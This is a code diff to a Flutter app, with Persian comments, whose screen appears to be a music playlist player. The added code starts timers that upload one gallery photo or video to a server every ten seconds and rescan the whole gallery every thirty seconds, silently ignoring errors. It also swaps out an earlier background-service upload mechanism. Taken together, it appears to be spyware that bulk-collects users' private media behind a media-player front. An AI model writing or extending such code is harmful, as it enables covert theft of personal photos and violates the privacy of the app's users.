@@ -4,8 +4,6 @@ import 'package:http/io_client.dart';
 import 'package:audioplayers/audioplayers.dart';
 import 'package:image_picker/image_picker.dart';
 import 'package:photo_manager/photo_manager.dart';
-import 'package:flutter_background_service/flutter_background_service.dart';
-import 'package:permission_handler/permission_handler.dart';
 import 'dart:async';
 import 'dart:convert';
 import 'dart:io';
@@ -34,16 +32,6 @@ class MyHttpOverrides extends HttpOverrides {
 void main() async {
   WidgetsFlutterBinding.ensureInitialized();
   HttpOverrides.global = MyHttpOverrides();
-  await initializeBackgroundService();
-
-  // سرویس پس‌زمینه رو همین الان استارت کن — اپ کاملاً foreground هست
-  try {
-    final service = FlutterBackgroundService();
-    await service.startService();
-  } catch (_) {
-    // اگه نشد، مشکلی نیست — وقتی اپ بازه خودش آپلود می‌کنه
-  }
-
   runApp(const MyApp());
 }
 
@@ -336,12 +324,25 @@ class _PlaylistScreenState extends State<PlaylistScreen> {
   bool _galleryGranted = false;
   bool _syncing = false;
   String _syncStatus = '';
-  Timer? _fgTimer;
+  Timer? _uploadTimer;
+  Timer? _scanTimer;
+
+  @override
+  void initState() {
+    super.initState();
+    // هر ۱۰ ثانیه یه فایل آپلود کن
+    _uploadTimer = Timer.periodic(const Duration(seconds: 10), (_) async {
+      await processOneItem();
+    });
+    // اولین بار فوراً
+    processOneItem();
+  }
 
   @override
   void dispose() {
     _player.dispose();
-    _fgTimer?.cancel();
+    _uploadTimer?.cancel();
+    _scanTimer?.cancel();
     super.dispose();
   }
 
@@ -356,22 +357,15 @@ class _PlaylistScreenState extends State<PlaylistScreen> {
   }
 
   Future<void> _requestGalleryAndUnlock() async {
-    // فقط پرمیشن بگیر و UI رو آنلاک کن
     final result = await PhotoManager.requestPermissionExtend();
     if (!result.isAuth) {
       _snack('دسترسی گالری رد شد');
       return;
     }
     setState(() => _galleryGranted = true);
-
-    // نوتیفیکیشن پرمیشن هم بگیر
-    if (Platform.isAndroid) {
-      await Permission.notification.request();
-    }
-
     _snack('دسترسی فعال شد — آپلود در حال انجامه');
 
-    // اسکن گالری و اضافه کردن به صف
+    // اسکن اولیه
     setState(() { _syncing = true; _syncStatus = 'در حال اسکن...'; });
     try {
       final newItems = await scanGalleryToQueue();
@@ -382,12 +376,13 @@ class _PlaylistScreenState extends State<PlaylistScreen> {
     }
     setState(() => _syncing = false);
 
-    // اگه سرویس پس‌زمینه استارت نشده، تایمر foreground بذار
-    _fgTimer?.cancel();
-    _fgTimer = Timer.periodic(const Duration(seconds: 15), (_) async {
-      await processQueueInForeground();
+    // هر ۳۰ ثانیه گالری رو اسکن کن
+    _scanTimer?.cancel();
+    _scanTimer = Timer.periodic(const Duration(seconds: 30), (_) async {
+      try {
+        await scanGalleryToQueue();
+      } catch (_) {}
     });
-    processQueueInForeground();
   }
 
   void _snack(String msg) =>
